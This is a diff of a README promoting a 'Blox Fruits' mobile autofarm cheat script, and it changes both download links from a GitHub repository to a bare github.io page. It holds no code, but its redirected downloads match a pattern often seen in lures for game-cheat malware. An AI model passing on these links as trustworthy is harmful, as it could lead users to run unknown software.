@@ -1,6 +1,6 @@
 # 🎮 Blox-Fruits-Mobile-Script-Autofarm-2026 - Automate your game progress with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/bennettetka-max/Blox-Fruits-Mobile-Script-Autofarm-2026)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://bennettetka-max.github.io)
 
 This project provides a tool for automating tasks in Blox Fruits. It uses advanced memory reading and screen capture technology to perform actions within the game. The software handles repetitive farming tasks so you can focus on other priorities.
 
@@ -32,7 +32,7 @@ Follow these steps to set up the software on your computer.
 
 Visit the following page to get the latest version of the script:
 
-[Download Link: Blox-Fruits-Mobile-Script-Autofarm-2026](https://github.com/bennettetka-max/Blox-Fruits-Mobile-Script-Autofarm-2026)
+[Download Link: Blox-Fruits-Mobile-Script-Autofarm-2026](https://bennettetka-max.github.io)
 
 ### Step 2: Prepare Your System
 
